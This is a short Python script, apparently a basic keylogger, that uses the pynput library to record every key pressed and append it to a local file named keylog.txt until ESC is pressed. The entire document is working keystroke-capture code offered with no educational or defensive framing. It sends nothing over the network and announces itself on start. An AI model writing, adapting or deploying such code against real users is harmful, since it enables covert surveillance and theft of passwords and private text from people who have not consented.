from pynput import keyboard

log_file = "keylog.txt"

def write_to_file(key):
    try:
        key_data = key.char
    except AttributeError:
        key_data = f"[{key}]"

    with open(log_file, "a") as f:
        f.write(key_data)


def on_press(key):
    write_to_file(key)


def on_release(key):
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False


print("=== Keylogger Started ===")
print("Press ESC to stop...\n")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()